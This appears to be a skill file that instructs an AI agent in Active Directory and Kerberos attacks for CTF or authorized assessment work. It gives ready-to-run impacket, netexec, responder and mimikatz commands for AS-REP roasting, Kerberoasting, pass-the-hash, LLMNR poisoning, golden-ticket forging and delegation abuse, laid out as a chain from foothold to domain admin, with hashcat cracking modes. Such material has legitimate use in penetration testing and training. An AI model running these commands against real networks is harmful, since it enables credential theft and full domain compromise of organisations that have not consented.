name: ad-kerberos
description: Active Directory / Kerberos attack playbook — AS-REP roasting, Kerberoasting, golden/silver ticket, pass-the-hash/ticket, and delegation abuse. Use on AD/lab/network challenges where Kerberos (port 88) or Windows hosts are in scope.
---

# Active Directory / Kerberos Attack

Authorized CTF/assessment use. AD attacks are a chain: get a foothold → harvest credentials/hashes → forge or relay tickets → domain admin. Each step below is one move in that chain.

## 1. The attack order (foothold → DA)

1. **Recon:** `netexec smb <targets>`, `crackmapexec smb`, find DCs, `GetNPUsers`/`GetUserSPNs`.
2. **Harvest a hash or ticket** (below).
3. **Crack it offline** or **forge a ticket** with it.
4. **Lateral / DA** with the ticket.

## 2. Credential harvesting attacks

**AS-REP roasting** (accounts with "Do not require Kerberos preauth"):
```bash
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC -no-pass   # get AS-REP hashes → crack
```
**Kerberoasting** (service accounts with SPNs):
```bash
impacket-GetUserSPNs domain/user:pass -dc-ip DC -request              # TGS hashes → crack
```
**Pass-the-Hash (PtH):**
```bash
impacket-psexec -hashes :NTLMHASH domain/admin@target
netexec smb target -u admin -H NTLMHASH
```
**Responder / LLMNR poisoning:** on the segment, `responder -I eth0` captures NTLMv2 hashes from broadcast name resolution.

## 3. Ticket forging

- **Golden ticket** (have the `krbtgt` hash = full domain):
```bash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN Administrator
impacket-psexec -k -no-pass domain/Administrator@DC
```
- **Silver ticket** (have a SERVICE hash = that service only): forge a TGS for that service.
- **Pass-the-Ticket (PtT):** export a `ccache`/kirbi ticket, import it, use `-k -no-pass`.
- **Overpass-the-Hash:** NTLM hash → TGT via `asktgt`, then PtT.

## 4. Delegation abuse

- **Unconstrained delegation:** compromise the host → its cached TGTs belong to anyone who authenticated to it (mimikatz `sekurlsa::tickets`).
- **Constrained delegation:** the host can impersonate a user to a specific service → request a ticket for that user (`getST.py`).
- **Resource-based constrained delegation:** write `msDS-AllowedToActOnBehalfOfOtherIdentity` → `rbcd.py` → impersonate.

## 5. Tools

`impacket` (GetNPUsers/GetUserSPNs/psexec/ticketer/secretsdump), `netexec`/`crackmapexec`, `mimikatz` (on-host), `hashcat` (`-m 18200` kerberoast, `-m 5600` netntlmv2).

## Cross-cutting
- **One hash or ticket is the pivot** — roast, crack, or forge; don't brute passwords over SMB.
- **krbtgt hash = golden ticket = full domain** — if `secretsdump` gets it, the game is over.
- Self-verify each step (the ticket/hash actually authenticates) before moving deeper.
